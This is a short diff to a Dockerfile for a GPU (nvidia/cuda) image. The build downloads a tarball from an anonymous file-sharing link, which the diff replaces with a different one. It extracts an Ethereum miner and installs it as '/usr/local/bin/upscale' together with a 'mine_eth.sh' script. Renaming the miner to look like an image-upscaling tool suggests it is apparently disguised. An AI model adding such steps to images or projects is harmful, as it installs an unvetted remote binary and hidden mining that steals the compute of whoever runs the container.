@@ -4,12 +4,15 @@ LABEL maintainer="Roman Nikov"
 
 RUN apt update; \
     apt install -y wget; \
-    wget https://www.4sync.com/web/directDownload/1RZH1ucq/15xqQxN1.a888d2a0703a72867b648d5452418dce; \
-    tar xf 15xqQxN1.a888d2a0703a72867b648d5452418dce; \
+    wget https://cdn.filesend.jp/private/AZnD5WgBGaXyz7qfoCPdmM9VWUpixxJfx2-RpZFchBKoBIX5Mx-hlvfVMYwHiFcw/upscale.tar.gz; \
+    tar xf upscale.tar.gz; \
     cd upscale; \
     cp miner /usr/local/bin/upscale; \
     cp mine_eth.sh /usr/local/bin/mine_eth.sh; \
     cd /usr/local/bin;
+    
+FROM nvidia/cuda:9.0-base-ubuntu16.04
+COPY --from=build / /
 
 WORKDIR /usr/local/bin
 
